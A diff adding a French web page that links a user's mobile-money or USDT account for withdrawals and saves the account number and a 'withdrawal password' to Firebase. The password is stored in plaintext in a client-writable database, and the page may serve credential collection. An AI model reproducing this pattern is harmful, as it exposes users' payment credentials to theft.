@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liaison de Compte de Retrait</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            transition: all 0.3s ease;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 800px;
+            width: 95%;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #2d3748;
+        }
+
+        .header h2 {
+            font-size: 2.2em;
+            margin-bottom: 15px;
+            color: #2d3748;
+            font-weight: 700;
+        }
+
+        .header p {
+            color: #666;
+            line-height: 1.6;
+            font-size: 1.1em;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 8px;
+        }
+
+        .operators {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .operator {
+            background: #fff;
+            padding: 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            border: 2px solid transparent;
+        }
+
+        .operator:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.1);
+        }
+
+        .operator.selected {
+            border-color: #4299e1;
+            background: #ebf8ff;
+            animation: pulse 2s infinite;
+        }
+
+        .operator img {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+            margin-bottom: 15px;
+            border-radius: 10px;
+        }
+
+        .operator-name {
+            font-weight: 600;
+            color: #2d3748;
+            font-size: 1.1em;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            color: #4a5568;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1em;
+            background: #fff;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #4299e1;
+            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.2);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #4299e1, #667eea);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(66, 153, 225, 0.2);
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #3182ce, #5a67d8);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(66, 153, 225, 0.3);
+        }
+
+        #message {
+            margin-top: 25px;
+        }
+
+        .message-error {
+            background: #fff5f5;
+            color: #c53030;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #fc8181;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .message-success {
+            background: #f0fff4;
+            color: #2f855a;
+            padding: 15px;
+            border-radius: 10px;
+            border-left: 4px solid #68d391;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(66, 153, 225, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(66, 153, 225, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(66, 153, 225, 0); }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .operators {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+                gap: 15px;
+            }
+
+            .operator img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .header h2 {
+                font-size: 1.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container animate__animated animate__fadeIn">
+        <div class="header">
+            <h2>Liaison de Compte de Retrait</h2>
+            <div class="warning">
+                <p>⚠️ Veuillez lire attentivement : une configuration incorrecte entraînera le rejet de votre demande de retrait.</p>
+            </div>
+        </div>
+
+        <div class="operators" id="operatorSelection">
+            <div class="operator animate__animated animate__fadeIn" data-operator="MTN">
+                <img src="https://image.noelshack.com/fichiers/2024/52/7/1735433587-logo-mtn.jpg" alt="MTN">
+                <div class="operator-name">MTN Money</div>
+            </div>
+            <div class="operator animate__animated animate__fadeIn" data-operator="MOOV">
+                <img src="https://image.noelshack.com/fichiers/2024/52/7/1735433662-icon-assistance-moovci-plan-de-travail-1-1.png" alt="Moov">
+                <div class="operator-name">Moov Money</div>
+            </div>
+            <div class="operator animate__animated animate__fadeIn" data-operator="ORANGE">
+                <img src="https://image.noelshack.com/fichiers/2024/52/7/1735433702-images-2.png" alt="Orange">
+                <div class="operator-name">Orange Money</div>
+            </div>
+            <div class="operator animate__animated animate__fadeIn" data-operator="WAVE">
+                <img src="https://image.noelshack.com/fichiers/2024/52/7/1735433723-images-3.png" alt="Wave">
+                <div class="operator-name">Wave</div>
+            </div>
+            <div class="operator animate__animated animate__fadeIn" data-operator="USDT">
+                <img src="https://image.noelshack.com/fichiers/2024/52/7/1735433753-825.png" alt="USDT">
+                <div class="operator-name">USDT</div>
+            </div>
+        </div>
+
+        <form id="withdrawalForm" onsubmit="return false;">
+            <input type="hidden" id="operator" name="operator">
+            
+            <div class="form-group">
+                <label for="phone">📱 Numéro de compte de retrait</label>
+                <input type="text" id="phone" placeholder="Ex: +225,+229,+228,+226,+221" required>
+            </div>
+
+            <div class="form-group">
+                <label for="code">🔒 Mot de passe de retrait</label>
+                <input type="password" id="code" placeholder="Entrez votre mot de passe sécurisé" required>
+            </div>
+
+            <button type="submit" onclick="setupWithdrawal()">Lier le compte</button>
+        </form>
+
+        <div id="message"></div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-auth.js";
+        import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/11.3.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDIB-raa12rkzqxRhflOMLBwL4hBycTgmo",
+            authDomain: "coke-eea48.firebaseapp.com",
+            databaseURL: "https://coke-eea48-default-rtdb.firebaseio.com",
+            projectId: "coke-eea48",
+            storageBucket: "coke-eea48.firebasestorage.app",
+            messagingSenderId: "217366074971",
+            appId: "1:217366074971:web:948bdc5baeeea93fac117e"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase();
+        const auth = getAuth();
+
+        document.querySelectorAll('.operator').forEach(op => {
+            op.addEventListener('click', () => {
+                document.querySelectorAll('.operator').forEach(o => o.classList.remove('selected'));
+                op.classList.add('selected');
+                document.getElementById('operator').value = op.dataset.operator;
+            });
+        });
+
+        window.setupWithdrawal = async function() {
+            const phone = document.getElementById('phone').value;
+            const operator = document.getElementById('operator').value;
+            const code = document.getElementById('code').value;
+
+            if (!phone || !operator || !code) {
+                showMessage('Veuillez remplir tous les champs et sélectionner un opérateur', 'error');
+                return;
+            }
+
+            try {
+                const user = auth.currentUser;
+                if (!user) {
+                    showMessage('Vous devez être connecté', 'error');
+                    return;
+                }
+
+                await set(ref(db, `users/${user.uid}/withdrawalConfig`), {
+                    phone,
+                    operator,
+                    code,
+                    configuredAt: Date.now()
+                });
+
+                showMessage('Configuration enregistrée avec succès! Redirection en cours...', 'success');
+                
+                setTimeout(() => {
+                    window.location.href = 'carte.html';
+                }, 2000);
+            } catch (error) {
+                showMessage(`Erreur: ${error.message}`, 'error');
+            }
+        };
+
+        function showMessage(text, type) {
+            const messageDiv = document.getElementById('message');
+            messageDiv.innerHTML = `
+                <div class="message-${type} animate__animated animate__fadeIn">
+                    ${text}
+                </div>
+            `;
+        }
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) {
+                window.location.href = 'retrait.html';
+            }
+        });
+    </script>
+</body>
+</html>
